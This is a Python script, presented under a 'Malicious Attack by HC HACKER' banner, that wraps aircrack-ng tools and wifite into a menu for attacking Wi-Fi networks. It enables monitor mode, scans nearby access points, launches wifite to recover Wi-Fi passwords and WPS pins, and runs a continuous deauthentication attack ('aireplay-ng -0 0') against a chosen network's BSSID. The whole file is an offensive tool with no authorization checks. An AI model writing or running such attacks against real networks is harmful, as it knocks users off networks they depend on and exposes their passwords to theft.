import os;
import time as t;
import json
import subprocess
import re
from tabulate import tabulate
os.system('clear')
file="data.json"
menu='''
                             Menu
[1] Scanner Wifi(Airodump-ng).
[2] Get password Wifi and WPS pin (Wifite).
[3] deauth Attack in wifi(Aireplay-ng).
[4] Exit

'''
spash='''

 ███▄ ▄███▓ ▄▄▄       ██▓     ██▓ ▄████▄   ██▓ ▒█████   █    ██   ██████     ▄▄▄     ▄▄▄█████▓▄▄▄█████▓ ▄▄▄       ▄████▄   ██ ▄█▀
▓██▒▀█▀ ██▒▒████▄    ▓██▒    ▓██▒▒██▀ ▀█  ▓██▒▒██▒  ██▒ ██  ▓██▒▒██    ▒    ▒████▄   ▓  ██▒ ▓▒▓  ██▒ ▓▒▒████▄    ▒██▀ ▀█   ██▄█▒ 
▓██    ▓██░▒██  ▀█▄  ▒██░    ▒██▒▒▓█    ▄ ▒██▒▒██░  ██▒▓██  ▒██░░ ▓██▄      ▒██  ▀█▄ ▒ ▓██░ ▒░▒ ▓██░ ▒░▒██  ▀█▄  ▒▓█    ▄ ▓███▄░ 
▒██    ▒██ ░██▄▄▄▄██ ▒██░    ░██░▒▓▓▄ ▄██▒░██░▒██   ██░▓▓█  ░██░  ▒   ██▒   ░██▄▄▄▄██░ ▓██▓ ░ ░ ▓██▓ ░ ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄ 
▒██▒   ░██▒ ▓█   ▓██▒░██████▒░██░▒ ▓███▀ ░░██░░ ████▓▒░▒▒█████▓ ▒██████▒▒    ▓█   ▓██▒ ▒██▒ ░   ▒██▒ ░  ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄
░ ▒░   ░  ░ ▒▒   ▓▒█░░ ▒░▓  ░░▓  ░ ░▒ ▒  ░░▓  ░ ▒░▒░▒░ ░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░    ▒▒   ▓▒█░ ▒ ░░     ▒ ░░    ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒
░  ░      ░  ▒   ▒▒ ░░ ░ ▒  ░ ▒ ░  ░  ▒    ▒ ░  ░ ▒ ▒░ ░░▒░ ░ ░ ░ ░▒  ░ ░     ▒   ▒▒ ░   ░        ░      ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░
░      ░     ░   ▒     ░ ░    ▒ ░░         ▒ ░░ ░ ░ ▒   ░░░ ░ ░ ░  ░  ░       ░   ▒    ░        ░        ░   ▒   ░        ░ ░░ ░ 
       ░         ░  ░    ░  ░ ░  ░ ░       ░      ░ ░     ░           ░           ░  ░                       ░  ░░ ░      ░  ░   
                                 ░                                                                               ░               

                                                                                 by HC HACKER 
'''
#Her loaded file data.json
def load_variables(filename=file):
    with open(filename, 'r') as file:
        return json.load(file)
def save_variables(variables, filename=file):
    with open(filename, 'w') as file:
        json.dump(variables, file)       
def check_and_create_file(filename=file):
    if not os.path.exists(filename):
        variables = {

        }
        save_variables(variables, filename)
    else:
       pass
check_and_create_file()
variables = load_variables()
##her loaded wirelesse
def list_wireless_interfaces():
    try:
        result = subprocess.run(['iwconfig'], capture_output=True, text=True)
        iwconfig_output = result.stdout
        interfaces = []
        for line in iwconfig_output.splitlines():
            if 'IEEE 802.11' in line:
                interface_name = line.split()[0]
                interfaces.append(interface_name)
        return interfaces
    except Exception as e:
        print(f"An error occurred: {e}")
        return []  
##select  interfaces
wireless_interfaces = list_wireless_interfaces()
if wireless_interfaces:
    listInterface=[]
    for interface in wireless_interfaces:
        listInterface.append(interface)

else:
    print("No wireless interfaces found.")
    exit()

##    
def SelectInterfaces():
    while(True):
        try:
            listChoix=[]
            x=0
            print("Select your Interface :\n")
            for interfaceSelector in listInterface:
                print(f"[{x}]- {interfaceSelector}")
                listChoix.append(x)
                x+=1      
                #print("list num"+str(listChoix))
            choix=int(input("[+] "))
            if choix in listChoix:
                print(f"Wireless selected is :{listInterface[choix]}")
                os.system(f"sudo airmon-ng start {listInterface[choix]}")

                wireless_interfaces2 = list_wireless_interfaces()
                if wireless_interfaces2:
                    #print("Wireless interfaces found:")
                    listInterface2=[]
                    for interface1 in wireless_interfaces2:
                        listInterface2.append(interface1)
                WIRELESSselected=listInterface2[choix]
                variables['interfaceTemp']=WIRELESSselected
                save_variables(variables)
                break
            else:
                os.system('clear')
                print('Error : Wireless not found try again !!')
                t.sleep(3)
        except ValueError:
                print("Invalid input. Please enter a number.")     
#Scanner BSSID (wifi)
def get_wireless_info(interface):
    # Run the iwlist command
    result = subprocess.run(['iwlist', interface, 'scan'], capture_output=True, text=True)
    iwlist_output = result.stdout
    bssid_pattern = re.compile(r'Cell \d+ - Address: ([\dA-F:]{17})')
    channel_pattern = re.compile(r'Channel:(\d+)')
    essid_pattern = re.compile(r'ESSID:"([^"]+)"')
    bssids = bssid_pattern.findall(iwlist_output)
    channels = channel_pattern.findall(iwlist_output)
    essids = essid_pattern.findall(iwlist_output)
    return bssids, channels, essids
#deauth wifi 
def DeauthAttack(interface):
    try:
        listWifi = []
        while True:
            bssids, channels, essids = get_wireless_info(interface)
            os.system("clear")
            listWifi.clear()
            for idx, (bssid, channel, essid) in enumerate(zip(bssids, channels, essids)):
                wifi_info = {"id": idx, "bssid": bssid, "channel": channel, "essid": essid}
                listWifi.append(wifi_info)           
            table_data = [[wifi["id"], wifi["bssid"], wifi["channel"], wifi["essid"]] for wifi in listWifi]
            headers = ["ID", "BSSID", "Channel", "ESSID"]
            print(tabulate(table_data, headers, tablefmt="grid"))
    except KeyboardInterrupt:
        print("\nExiting the scanner.")
        os.system("clear")
        print("\nSelect your wifi :")
        table_data = [[wifi["id"], wifi["bssid"], wifi["channel"], wifi["essid"]] for wifi in listWifi]
        headers = ["ID", "BSSID", "Channel", "ESSID"]
        listIdWifi=[wifi["id"] for wifi in listWifi]
        os.system("clear")
        while True:
            try:
                print(tabulate(table_data, headers, tablefmt="grid"))
                choix = int(input("Entry ID: "))
                if choix in listIdWifi:
                    macAddress=listWifi[choix]["bssid"]
                    channel=listWifi[choix]["channel"]
                    essid=listWifi[choix]["essid"]
                    print("Attack Deauth start")
                    t.sleep(2)
                    print(f"Wifi Selected :ID :{choix}| MAC Address :{macAddress} | ESSID:{essid} | Channel: {channel}")
                    t.sleep(1)
                    print("Changing Channel ")
                    os.system(f"sudo iwconfig {interface} channel {channel} ")
                    print(" Attack started ")
                    os.system(f"sudo aireplay-ng -a {macAddress} -0 0 {interface}")
                    break
                else:
                    print("ID not in the list. Please try again.")
            except ValueError:
                print("Invalid input. Please enter a number.")
def main():
    print(spash)
    t.sleep(4)
    os.system('clear')
    SelectInterfaces()
    while(True):
        try:
            os.system('clear')
            print(menu)
            wlan=variables['interfaceTemp']
            choix= int(input("Select your choix :"))
            if(1==choix):
                print("Wait to enable monitor mode")
                t.sleep(3)
                os.system(f"sudo airmon-ng start {wlan}")
                print("Monitor mode enabled succesfully.")
                t.sleep(2)
                os.system('clear')
                print("Scranner Started..")
                t.sleep(2)
                os.system(f"sudo airodump-ng {wlan}")
                t.sleep(3)
            elif(2==choix):
                os.system('clear')
                print("Wifite Started...")
                t.sleep(2)
                os.system(f"sudo wifite")
                t.sleep(3) 
            elif(3==choix):
                os.system('clear')
                DeauthAttack(variables['interfaceTemp']) 
            elif(4==choix):     
                os.system('clear')  
                print("Exiting Programe.\n Thank you for use this tool.")
                t.sleep(4) 
                os.system('clear')
                os.system(f'sudo airmon-ng stop {wlan}')
                os.system('clear')
                print(spash)
                t.sleep(2)
                os.system('clear')
                exit()
            else:
                print()    
        except ValueError:
            print("Syntax Error")

main()


